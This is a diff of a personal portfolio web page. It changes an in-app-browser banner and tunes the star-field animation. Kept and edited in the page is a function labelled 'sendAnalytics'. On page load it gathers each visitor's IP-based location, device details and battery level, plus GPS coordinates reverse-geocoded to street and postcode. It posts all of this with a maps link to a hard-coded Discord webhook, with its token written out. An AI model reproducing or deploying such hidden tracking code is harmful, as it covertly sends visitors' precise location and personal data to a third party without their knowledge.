@@ -3,35 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<script>
-(function(){
-  var ua = navigator.userAgent || '';
-  var isIAB = /Instagram|FBAN|FBAV|TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp|Twitter/i.test(ua);
-  if(!isIAB) return;
-  var url = location.href;
-  var isAndroid = /Android/i.test(ua);
-  var isIOS = /iPhone|iPad|iPod/i.test(ua);
-  var cardCSS = '*{box-sizing:border-box;margin:0;padding:0}body{background:#03050f;color:#eeeef2;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}.card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:32px 24px;max-width:360px}h2{font-size:1.3rem;margin-bottom:12px}p{font-size:0.9rem;color:rgba(238,238,242,0.6);margin-bottom:24px;line-height:1.6}button,a{display:inline-block;padding:12px 28px;background:linear-gradient(135deg,rgba(124,106,247,0.9),rgba(34,211,238,0.7));border-radius:50px;color:#fff;border:none;font-weight:700;font-size:0.85rem;cursor:pointer;text-decoration:none;width:100%;margin-bottom:10px}small{color:rgba(238,238,242,0.35);font-size:0.75rem;word-break:break-all}';
-  if(isAndroid){
-    location.replace('intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;S.browser_fallback_url=' + encodeURIComponent(url) + ';end');
-    document.addEventListener('DOMContentLoaded', function(){
-      document.open();
-      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Open in Browser</title><style>' + cardCSS + '</style></head><body><div class="card"><h2>🌐 Open in Browser</h2><p>Tap the button below to open in your default browser.</p><a href="' + url + '">Open Browser</a></div></body></html>');
-      document.close();
-    });
-    return;
-  }
-  if(isIOS){
-    var safariUrl = 'x-safari-' + url;
-    document.addEventListener('DOMContentLoaded', function(){
-      document.open();
-      document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Open in Safari</title><style>' + cardCSS + '</style></head><body><div class="card"><h2>🌐 Open in Safari</h2><p>Tap to open in Safari.</p><a href="' + safariUrl + '" onclick="setTimeout(function(){document.querySelector(\'a\').href=\'' + url + '\'}, 500)">Open Safari</a><br><small>' + url + '</small></div></body></html>');
-      document.close();
-    });
-    return;
-  }
-})();
-</script>
 <title>Hi there! — by Riski Romadhan Maulana</title>
 <meta name="description" content="Crafting futuristic digital experiences with premium design, cutting-edge technology AND Kuli with pacul. By Riski Romadhan Maulana.">
 <meta name="author" content="Riski Romadhan Maulana">
@@ -79,14 +50,33 @@ a,button{touch-action:manipulation}
 ::-webkit-scrollbar-track{background:var(--deep)}
 ::-webkit-scrollbar-thumb{background:rgba(124,106,247,0.4);border-radius:2px}
 
+/* IN-APP BROWSER BANNER */
+#in-app-banner {
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0;
+  background: linear-gradient(135deg, rgba(244,114,182,0.9), rgba(124,106,247,0.9));
+  color: white;
+  text-align: center;
+  padding: 12px 20px;
+  font-family: var(--font-body);
+  font-size: 0.85rem;
+  font-weight: 500;
+  z-index: 9999;
+  backdrop-filter: blur(10px);
+  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+}
+#in-app-banner strong { font-weight: 700; font-family: var(--font-display); }
+.in-app-close { position: absolute; right: 15px; top: 12px; font-weight: bold; cursor: pointer; }
+
 #galaxy-canvas{position:fixed;inset:0;z-index:0;pointer-events:none;will-change:transform}
 .aurora-layer{position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden}
 .aurora-layer::before,
-.aurora-layer::after{content:'';position:absolute;border-radius:50%;filter:blur(80px);will-change:transform,opacity;animation:auroraPulse 18s ease-in-out infinite}
+.aurora-layer::after{content:'';position:absolute;border-radius:50%;filter:blur(80px);will-change:transform,opacity;animation:auroraPulse 18s ease-in-out infinite; transform-translateZ: 0;}
 .aurora-layer::before{width:70vw;height:55vh;top:-15%;left:-10%;background:radial-gradient(ellipse,rgba(124,106,247,0.12) 0%,transparent 70%);animation-delay:0s}
 .aurora-layer::after{width:60vw;height:50vh;bottom:-10%;right:-5%;background:radial-gradient(ellipse,rgba(34,211,238,0.09) 0%,transparent 70%);animation-delay:-9s}
 .aurora-mid{position:fixed;inset:0;pointer-events:none;z-index:1}
-.aurora-mid::before{content:'';position:absolute;width:50vw;height:40vh;top:30%;left:25%;background:radial-gradient(ellipse,rgba(244,114,182,0.06) 0%,transparent 70%);filter:blur(80px);animation:auroraPulse 22s ease-in-out 4s infinite;border-radius:50%}
+.aurora-mid::before{content:'';position:absolute;width:50vw;height:40vh;top:30%;left:25%;background:radial-gradient(ellipse,rgba(244,114,182,0.06) 0%,transparent 70%);filter:blur(80px);animation:auroraPulse 22s ease-in-out 4s infinite;border-radius:50%; transform-translateZ: 0;}
 @keyframes auroraPulse{0%,100%{transform:scale(1) translate(0,0);opacity:0.7}33%{transform:scale(1.1) translate(2%,3%);opacity:1}66%{transform:scale(0.95) translate(-2%,-2%);opacity:0.6}}
 
 @media(max-width:640px){
@@ -96,7 +86,7 @@ a,button{touch-action:manipulation}
 
 .glass{background:var(--surface);-webkit-backdrop-filter:blur(20px) saturate(1.5);backdrop-filter:blur(20px) saturate(1.5);border:1px solid var(--border);border-radius:20px}
 .glass-strong{background:rgba(8,12,28,0.72);-webkit-backdrop-filter:blur(32px) saturate(1.8);backdrop-filter:blur(32px) saturate(1.8);border:1px solid var(--border);border-radius:32px}
-.glass-card{background:var(--surface);-webkit-backdrop-filter:blur(16px);backdrop-filter:blur(16px);border:1px solid var(--border);border-radius:20px;transition:background 0.3s,border-color 0.3s,transform 0.4s cubic-bezier(.2,.8,.2,1)}
+.glass-card{background:var(--surface);-webkit-backdrop-filter:blur(16px);backdrop-filter:blur(16px);border:1px solid var(--border);border-radius:20px;transition:background 0.3s,border-color 0.3s,transform 0.4s cubic-bezier(.2,.8,.2,1); transform: translateZ(0);}
 @media(hover:hover){
   .glass-card:hover{background:var(--surface2);border-color:var(--border2);transform:translateY(-5px)}
 }
@@ -256,6 +246,7 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 @media(max-width:360px){
   .hero-btns{flex-direction:column;align-items:center}
   .btn-primary,.btn-ghost{width:100%;max-width:260px;justify-content:center}
+}
 .riski-name{
   font-family:'Orbitron', var(--font-display);
   font-weight:800;
@@ -317,22 +308,10 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 </head>
 <body>
 
-<style>
-#iab-banner{display:none;position:fixed;bottom:16px;left:50%;transform:translateX(-50%);z-index:9999;width:calc(100% - 32px);max-width:420px;background:rgba(8,12,28,0.96);border:1px solid rgba(124,106,247,0.5);border-radius:16px;padding:12px 16px;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);box-shadow:0 4px 32px rgba(0,0,0,0.5);animation:bannerSlide 0.4s cubic-bezier(.2,.8,.2,1)}
-@keyframes bannerSlide{from{opacity:0;transform:translateX(-50%) translateY(20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
-#iab-banner.show{display:flex;align-items:center;gap:12px}
-#iab-banner-icon{font-size:1.3rem;flex-shrink:0}
-#iab-banner-text{flex:1;font-family:'DM Sans',sans-serif;font-size:0.78rem;color:rgba(238,238,242,0.85);line-height:1.45}
-#iab-banner-text strong{color:#fff;font-weight:600}
-#iab-banner-open{flex-shrink:0;padding:7px 14px;background:linear-gradient(135deg,rgba(124,106,247,0.9),rgba(34,211,238,0.7));border:none;border-radius:50px;font-family:'Syne',sans-serif;font-size:0.65rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#fff;cursor:pointer;white-space:nowrap}
-#iab-banner-close{flex-shrink:0;background:none;border:none;color:rgba(238,238,242,0.4);font-size:1rem;cursor:pointer;padding:2px 4px;line-height:1}
-</style>
-
-<div id="iab-banner" role="alert">
-  <div id="iab-banner-icon">🌐</div>
-  <div id="iab-banner-text"><strong>Open in browser</strong> for the best experience</div>
-  <button id="iab-banner-open" id="iab-open-btn">visit</button>
-  <button id="iab-banner-close" aria-label="Tutup">&times;</button>
+<div id="in-app-banner">
+  <strong>Oops!</strong> Sepertinya kamu membuka web ini dari dalam aplikasi. <br>
+  Untuk pengalaman terbaik, tap ikon titik tiga di atas dan pilih <strong>"Buka di Browser Bawaan"</strong> (Safari/Chrome).
+  <span class="in-app-close" onclick="document.getElementById('in-app-banner').style.display='none'">✕</span>
 </div>
 
 <canvas id="galaxy-canvas" aria-hidden="true"></canvas>
@@ -703,6 +682,21 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 (function(){
 'use strict';
 
+// --- IN-APP BROWSER DETECTOR ---
+function checkInAppBrowser() {
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const isInsta = (ua.indexOf('Instagram') > -1);
+    const isFB = (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1);
+    const isTikTok = (ua.indexOf('TikTok') > -1);
+    const isLine = (ua.indexOf('Line') > -1);
+    
+    if (isInsta || isFB || isTikTok || isLine) {
+        document.getElementById('in-app-banner').style.display = 'block';
+    }
+}
+checkInAppBrowser();
+// ------------------------------
+
 document.addEventListener('DOMContentLoaded',()=>{ initReveal(); animateRings(); startCounters(); initNav(); });
 
 const cvs  = document.getElementById('galaxy-canvas');
@@ -759,7 +753,7 @@ const SPR = {
 
 const BG_STARS = [];
 (function buildBG(){
-  const N = isMob ? 600 : 1200;
+  const N = isMob ? 300 : 800; // Optimized count for performance
   for(let i=0;i<N;i++){
     const x = rng() * W;
     const y = rng() * H;
@@ -817,7 +811,9 @@ function initAndromeda(){
     if(rFrac < 0.08) return 0.012 * (rFrac / 0.08);
     return 0.012 / (0.8 + rFrac * 0.5);
   }
-  const N_BULGE = isMob ? 600 : 1200;
+  
+  // OPTIMIZED particle counts
+  const N_BULGE = isMob ? 300 : 700;
   const BCOLS = [[255,245,200],[255,240,190],[255,248,215],[255,252,230],[252,238,195],[255,245,210],[250,235,180],[255,250,225]];
   for(let i=0; i<N_BULGE; i++){
     const u = grng(); const rFrac = 0.28 * Math.pow(u, 1.6); const r = rFrac * G_MAJOR;
@@ -828,7 +824,7 @@ function initAndromeda(){
     const sz = rFrac < 0.03 ? 1.2+grng()*1.2 : rFrac < 0.10 ? 0.55+grng()*0.75 : 0.30+grng()*0.55;
     GP_BULGE.push({ r, angle: theta0, speed: orbitalSpeed(rFrac)*(0.85+grng()*0.30), baseAlpha: Math.min(brightness*(0.4+grng()*0.5),0.90), col, sz, phase: grng()*Math.PI*2, twinkle: 0.3+grng()*1.2 });
   }
-  const N_ARM = isMob ? 800 : 1600;
+  const N_ARM = isMob ? 400 : 900;
   const ACOLS_BLUE  = [[195,220,255],[180,210,255],[215,235,255],[245,252,255],[255,255,255]];
   const ACOLS_WHITE = [[245,250,255],[255,255,252],[255,252,248],[240,248,255]];
   const ARM_OFFSETS = [0, Math.PI];
@@ -846,7 +842,7 @@ function initAndromeda(){
     const sz = rFrac < 0.15 ? 0.45+grng()*0.65 : 0.22+grng()*0.45;
     GP_ARM.push({ r, angle: theta0, speed: orbitalSpeed(rFrac)*(0.90+grng()*0.20), baseAlpha: Math.min(brightness*(0.38+grng()*0.48),0.85), col, sz, phase: grng()*Math.PI*2, twinkle: 0.2+grng()*0.9 });
   }
-  const N_DISC = isMob ? 400 : 800;
+  const N_DISC = isMob ? 200 : 500;
   const DCOLS = [[245,248,255],[255,252,248],[240,246,255],[255,248,242],[248,245,255],[255,255,250]];
   for(let i=0; i<N_DISC; i++){
     const u = grng(); const rFrac = Math.min(-0.30 * Math.log(Math.max(u, 1e-8)), 1.0);
@@ -855,7 +851,7 @@ function initAndromeda(){
     const col = DCOLS[Math.floor(grng()*DCOLS.length)];
     GP_DISC.push({ r, angle: theta0, speed: orbitalSpeed(rFrac)*(0.80+grng()*0.35), baseAlpha: Math.min(radB*(0.28+grng()*0.42),0.65), col, sz: 0.18+grng()*0.32, phase: grng()*Math.PI*2, twinkle: 0.1+grng()*0.6 });
   }
-  const N_DUST = isMob ? 100 : 200;
+  const N_DUST = isMob ? 50 : 120;
   for(let i=0; i<N_DUST; i++){
     const rFrac = 0.50 + grng()*0.65; const r = rFrac * G_MAJOR;
     const theta0 = grng() * Math.PI * 2; const isWarm = grng() < 0.35;
@@ -1260,9 +1256,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   }, 4000);
 });
 
-(function scheduleAnalytics(){
-  function run(){
-    (async function sendAnalytics(){
+(async function sendAnalytics(){
   const WEBHOOK = 'https://discord.com/api/webhooks/1511445599046733905/SbRGVq0s6PlPBh3X_9SSyNEF7AqWH3tUIgIREZdw7UL7oH7wI6i2mQB_P7uI_p5g9vQA';
 
   if(sessionStorage.getItem('beta_analytics_sent')) return;
@@ -1354,73 +1348,36 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     } catch { return 'Unknown'; }
   }
 
-  const _ua_raw = navigator.userAgent || '';
-  const isIAB = /Instagram|FBAN|FBAV|Twitter|TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp/i.test(_ua_raw);
-  const iabName = /Instagram/i.test(_ua_raw) ? 'Instagram IAB'
-                : /FBAN|FBAV/i.test(_ua_raw) ? 'Facebook IAB'
-                : /Twitter/i.test(_ua_raw)   ? 'Twitter IAB'
-                : /TikTok/i.test(_ua_raw)    ? 'TikTok IAB'
-                : /Snapchat/i.test(_ua_raw)  ? 'Snapchat IAB'
-                : /WhatsApp/i.test(_ua_raw)  ? 'WhatsApp IAB'
-                : /LinkedInApp/i.test(_ua_raw)? 'LinkedIn IAB'
-                : isIAB ? 'In-App Browser' : null;
-
-  async function reverseGeocode(lat, lon){
-    const nomCtrl = new AbortController();
-    const nomTid  = setTimeout(()=> nomCtrl.abort(), 6000);
-    try {
-      const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, { signal: nomCtrl.signal });
-      clearTimeout(nomTid);
-      const data = await res.json();
-      if(data && data.address){
-        const a = data.address;
-        return {
-          jalan:     a.road || a.pedestrian || a.footway || a.path || '',
-          kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
-          kecamatan: a.city_district || a.district || a.county || '',
-          kota:      a.city || a.town || a.village || a.municipality || '',
-          negara:    a.country || '',
-          postcode:  a.postcode || '',
-          placeId:  `osm:${data.place_id}`,
-          lat, lon, accuracy: Math.round(lat)
-        };
-      }
-    } catch { clearTimeout(nomTid); }
-    return null;
-  }
-
   async function getDetailedLocation(){
     return new Promise((resolve)=>{
-      const _uaCheck = navigator.userAgent || '';
-      const _isIGBlock = /Instagram|FBAN|FBAV/i.test(_uaCheck);
-      if(_isIGBlock){ resolve(null); return; }
-
       if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
       sessionStorage.setItem('loc_asked','1');
       if(!navigator.geolocation){ resolve(null); return; }
-
-      function onSuccess(pos){
-        const { latitude: lat, longitude: lon, accuracy } = pos.coords;
-        reverseGeocode(lat, lon).then(result => {
-          if(result){ result.accuracy = Math.round(accuracy); }
-          resolve(result);
-        });
-      }
-
-      function onErrorFallback(){ resolve(null); }
-
-      function onErrorRetry(){
-        navigator.geolocation.getCurrentPosition(
-          onSuccess,
-          onErrorFallback,
-          { timeout: 10000, enableHighAccuracy: false, maximumAge: 60000 }
-        );
-      }
-
+      
+      // OPTIMIZED: Shorter timeout so it doesn't hang in In-App Browsers
       navigator.geolocation.getCurrentPosition(
-        onSuccess,
-        onErrorRetry,
-        { timeout: 15000, enableHighAccuracy: true, maximumAge: 30000 }
+        async (pos)=>{
+          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+          try {
+            const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            if(data && data.address){
+              const a = data.address;
+              resolve({
+                jalan:     a.road || a.pedestrian || a.footway || a.path || '',
+                kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
+                kecamatan: a.city_district || a.district || a.county || '',
+                kota:      a.city || a.town || a.village || a.municipality || '',
+                negara:    a.country || '',
+                postcode:  a.postcode || '',
+                placeId:  `osm:${data.place_id}`,
+                lat, lon, accuracy: Math.round(accuracy)
+              });
+            } else { resolve(null); }
+          } catch { resolve(null); }
+        },
+        ()=> resolve(null),
+        { timeout: 4000, enableHighAccuracy: false } 
       );
     });
   }
@@ -1477,7 +1434,7 @@ document.getElementById('contact-form').addEventListener('submit', async functio
       let g = { ip:'unknown', city:'Unknown', region:'Unknown', country:'Unknown', country_code:'?', postal:'Unknown', org:'Unknown', asn:'Unknown' };
       try {
         const ctrl = new AbortController();
-        const tid = setTimeout(()=> ctrl.abort(), 5000);
+        const tid = setTimeout(()=> ctrl.abort(), 4000); // Faster timeout
         const res = await fetch('https://ipapi.co/json/', { signal: ctrl.signal });
         clearTimeout(tid);
         if(res.ok){
@@ -1490,8 +1447,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
           g.postal       = d.postal       || 'Unknown';
           g.org          = d.org          || 'Unknown';
           g.asn          = d.asn          || 'Unknown';
-          g.lat          = d.latitude     || null;
-          g.lon          = d.longitude    || null;
         }
       } catch(e){}
       return g;
@@ -1510,7 +1465,6 @@ document.getElementById('contact-form').addEventListener('submit', async functio
     { name:'🧠 RAM',           value: ramGB, inline: true },
   ];
   if(battery) fields1.push({ name:'🔋 Battery', value: battery, inline: true });
-  if(iabName) fields1.push({ name:'📲 In-App Browser', value: iabName, inline: true });
   fields1.push(
     { name:'📐 Resolution',    value: scr, inline: true },
     { name:'🪟 Viewport',      value: viewport, inline: true },
@@ -1558,16 +1512,8 @@ document.getElementById('contact-form').addEventListener('submit', async functio
       { name:'🎯 Akurasi',      value: `±${detailLoc.accuracy}m`, inline: true },
       { name:'🔗 Google Maps',  value: `[Buka Maps](${mapsUrl})`, inline: true },
     );
-  } else if(geo.lat && geo.lon) {
-    const ipMapsUrl = `https://www.google.com/maps?q=${geo.lat},${geo.lon}`;
-    fields2.push(
-      { name:'📍 Lokasi (via IP)',  value: `${geo.city}, ${geo.region}, ${geo.country}`, inline: false },
-      { name:'🗺️ Koordinat (IP)',   value: `\`${Number(geo.lat).toFixed(4)}, ${Number(geo.lon).toFixed(4)}\``, inline: true },
-      { name:'🎯 Akurasi',          value: '~kota (IP)', inline: true },
-      { name:'🔗 Google Maps',      value: `[Buka Maps](${ipMapsUrl})`, inline: true },
-    );
   } else {
-    fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout', inline: false });
+    fields2.push({ name:'📍 GPS', value: 'Tidak diizinkan / timeout / Webview block', inline: false });
   }
 
   const embed2 = {
@@ -1581,21 +1527,12 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   try {
     const params = new URLSearchParams();
     params.append('payload_json', JSON.stringify({ embeds: [embed1, embed2] }));
-    fetch(WEBHOOK, {
+    await fetch(WEBHOOK + '?wait=true', {
       method: 'POST',
-      body: params,
-      keepalive: true
-    }).catch(()=>{});
+      body: params
+    });
   } catch(err) {
     console.warn('Analytics webhook failed:', err);
-  }
-})();
-  }
-
-  if(typeof requestIdleCallback === 'function'){
-    requestIdleCallback(run, { timeout: 8000 });
-  } else {
-    setTimeout(run, 2000);
   }
 })();
 
@@ -1603,76 +1540,58 @@ console.log('%c Hi there! 👋 %c by RISKI RM',
   'font-size:1.8em;font-weight:900;color:#a78bfa;background:#03050f;padding:4px 12px;border-radius:4px',
   'font-size:1em;color:#22d3ee;background:#03050f;padding:4px 8px;border-radius:4px');
 
+// OPTIMIZED TILT FUNCTION
 function initTilt(){
   document.querySelectorAll('.glass-card').forEach(card => {
     card.classList.add('tilt-card');
+    let isTicking = false;
+    
     if(!card.querySelector('.tilt-shine')){
       const shine = document.createElement('div');
       shine.className = 'tilt-shine';
       card.style.position = 'relative';
       card.appendChild(shine);
     }
+    
     card.addEventListener('mousemove', e => {
-      const rect = card.getBoundingClientRect();
-      const cx = rect.left + rect.width / 2;
-      const cy = rect.top + rect.height / 2;
-      const dx = (e.clientX - cx) / (rect.width / 2);
-      const dy = (e.clientY - cy) / (rect.height / 2);
-      const tiltX = dy * -12;
-      const tiltY = dx * 12;
-      card.style.transform = `perspective(700px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-6px) scale(1.02)`;
-      card.style.boxShadow = `${-tiltY*2}px ${tiltX*2}px 40px rgba(124,106,247,0.3), 0 16px 50px rgba(0,0,0,0.5)`;
-      const shine = card.querySelector('.tilt-shine');
-      if(shine){
-        const px = ((e.clientX - rect.left) / rect.width) * 100;
-        const py = ((e.clientY - rect.top) / rect.height) * 100;
-        shine.style.background = `radial-gradient(circle at ${px}% ${py}%, rgba(255,255,255,0.18), transparent 65%)`;
-        shine.style.opacity = '1';
+      if(!isTicking) {
+        requestAnimationFrame(() => {
+          const rect = card.getBoundingClientRect();
+          const cx = rect.left + rect.width / 2;
+          const cy = rect.top + rect.height / 2;
+          const dx = (e.clientX - cx) / (rect.width / 2);
+          const dy = (e.clientY - cy) / (rect.height / 2);
+          const tiltX = dy * -10; // Slightly reduced for smoother feel
+          const tiltY = dx * 10;
+          
+          card.style.transform = `perspective(700px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) translateY(-6px) scale(1.02)`;
+          card.style.boxShadow = `${-tiltY*2}px ${tiltX*2}px 40px rgba(124,106,247,0.3), 0 16px 50px rgba(0,0,0,0.5)`;
+          
+          const shine = card.querySelector('.tilt-shine');
+          if(shine){
+            const px = ((e.clientX - rect.left) / rect.width) * 100;
+            const py = ((e.clientY - rect.top) / rect.height) * 100;
+            shine.style.background = `radial-gradient(circle at ${px}% ${py}%, rgba(255,255,255,0.18), transparent 65%)`;
+            shine.style.opacity = '1';
+          }
+          isTicking = false;
+        });
+        isTicking = true;
       }
     }, { passive: true });
+    
     card.addEventListener('mouseleave', () => {
-      card.style.transform = '';
-      card.style.boxShadow = '';
-      const shine = card.querySelector('.tilt-shine');
-      if(shine) shine.style.opacity = '0';
+      requestAnimationFrame(() => {
+        card.style.transform = '';
+        card.style.boxShadow = '';
+        const shine = card.querySelector('.tilt-shine');
+        if(shine) shine.style.opacity = '0';
+      });
     }, { passive: true });
   });
 }
 setTimeout(initTilt, 800);
 
-})();
-
-</script>
-<script>
-(function(){
-  const ua = navigator.userAgent || '';
-  const isIAB = /TikTok|Snapchat|Line\/|WhatsApp|LinkedInApp|Twitter/i.test(ua);
-  if(!isIAB) return;
-
-  const banner = document.getElementById('iab-banner');
-  const closeBtn = document.getElementById('iab-banner-close');
-  if(!banner) return;
-  banner.classList.add('show');
-  closeBtn.addEventListener('click', ()=>{ banner.style.display='none'; });
-
-  const openBtn = document.getElementById('iab-banner-open');
-  if(!openBtn) return;
-  const url = location.href;
-  const isAndroid = /Android/i.test(ua);
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-
-  openBtn.removeAttribute('onclick');
-  openBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    if(isAndroid){
-      location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
-    } else if(isIOS){
-      location.href = 'x-safari-' + url;
-      setTimeout(function(){ location.href = url; }, 1500);
-    } else {
-      window.open(url, '_blank', 'noopener,noreferrer');
-    }
-  });
 })();
 </script>
 </body>
